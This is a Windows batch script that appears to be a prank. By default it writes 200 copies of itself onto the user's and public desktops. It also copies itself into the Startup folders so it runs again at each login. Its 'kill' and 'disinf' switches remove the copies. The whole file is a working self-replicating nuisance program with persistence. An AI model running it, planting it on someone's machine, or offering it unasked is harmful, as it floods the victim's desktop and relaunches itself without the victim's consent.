@echo OFF
IF "%1"=="" GOTO fill
IF "%1"=="fill" GOTO fill
IF "%1"=="kill" GOTO kill
IF "%1"=="inf" GOTO inf
IF "%1"=="disinf" GOTO kill
GOTO bye
:fill
IF EXIST C:\Users\%USERNAME%\Desktop\ (
FOR /L %%A IN (1, 1, 200) DO TYPE "%~df0" > "C:\Users\Public\Desktop\joke%%A.bat"
FOR /L %%A IN (1, 1, 200) DO TYPE "%~df0" > "C:\Users\%USERNAME%\Desktop\joke%%A.bat"
)
FOR /L %%A IN (1, 1, 200) DO TYPE "%~df0" > "C:\Documents and Settings\All Users\Desktop\joke%%A.bat"
FOR /L %%A IN (1, 1, 200) DO TYPE "%~df0" > "C:\Documents and Settings\%USERNAME%\Desktop\joke%%A.bat"
IF "%1"=="" GOTO inf
GOTO theend
:kill
IF EXIST C:\Users\%USERNAME%\Desktop\ (
FOR /L %%A IN (1, 1, 200) DO ECHO Y | DEL "C:\Users\Public\Desktop\joke%%A.bat"
FOR /L %%A IN (1, 1, 200) DO ECHO Y | DEL "C:\Users\%USERNAME%\Desktop\joke%%A.bat"
)
FOR /L %%A IN (1, 1, 200) DO ECHO Y | DEL "C:\Documents and Settings\All Users\Desktop\joke%%A.bat"
FOR /L %%A IN (1, 1, 200) DO ECHO Y | DEL "C:\Documents and Settings\%USERNAME%\Desktop\joke%%A.bat"
IF "%1"=="disinf" GOTO disinf
GOTO theend
:inf
TYPE "%~df0" > "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\joke.bat"
TYPE "%~df0" > "C:\Documents and Settings\%USERNAME%\Start Menu\Programs\Startup\joke.bat"
TYPE "%~df0" > "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\joke.bat"
GOTO theend
:disinf
ECHO Y | DEL "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\joke.bat"
ECHO Y | DEL "C:\Documents and Settings\%USERNAME%\Start Menu\Programs\Startup\joke.bat"
ECHO Y | DEL "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\joke.bat"
GOTO theend
:bye
:theend
